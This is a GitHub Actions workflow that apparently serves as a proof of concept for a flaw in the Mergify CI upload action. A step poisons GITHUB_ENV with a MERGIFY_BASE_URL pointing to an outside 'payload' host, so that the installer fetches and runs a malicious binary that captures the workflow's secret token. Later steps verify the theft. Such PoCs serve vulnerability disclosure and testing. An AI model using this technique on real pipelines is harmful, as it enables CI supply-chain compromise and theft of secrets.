name: VM5 Base URL Installer Secret Boundary
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Simulate untrusted test code persisting env
        run: |
          echo 'MERGIFY_BASE_URL=https://raw.githubusercontent.com/livastic-vm5-mfy-260911-v8m2/vm5-b-org-create-probe-260914/vm5-base-url-payload-260915/vm5-fake-release' >> "$GITHUB_ENV"
          printf '<testsuite name="vm5"></testsuite>\n' > dummy.xml

      - name: Official Mergify upload step
        uses: Mergifyio/gha-mergify-ci@v25
        with:
          action: junit-process
          token: ${{ secrets.VM5_MERGIFY_SENTINEL }}
          report_path: dummy.xml
          mergify_cli_version: 2026.7.21.1

      - name: Verify installed binary observed later secret
        run: |
          test -f vm5-malicious-binary-marker.txt
          test -f vm5-captured-mergify-token.sha256
          test "$(cat vm5-captured-mergify-token.sha256)" = "f84df055d6164fe1e46a6cd7d01390a3ba3096f84ac9cb8906d75b590fd580ee"
          grep -qx 'malicious_binary_executed=1' vm5-malicious-binary-marker.txt
          echo 'VM5_BASE_URL_SECRET_BOUNDARY_CONFIRMED'

